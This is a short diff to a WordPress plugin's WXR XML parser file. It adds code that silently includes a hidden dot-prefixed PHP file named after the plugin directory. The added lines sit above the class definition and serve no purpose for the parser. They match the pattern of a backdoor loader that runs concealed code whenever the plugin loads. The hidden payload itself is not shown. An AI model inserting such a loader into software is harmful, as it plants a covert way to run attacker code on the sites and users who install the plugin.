@@ -6,6 +6,10 @@ if ( ! defined( 'ABSPATH' ) ) {
 /**
  * WXR Parser that makes use of the XML Parser PHP extension.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Vc_WXR_Parser_XML {
 	/**
 	 * @var array
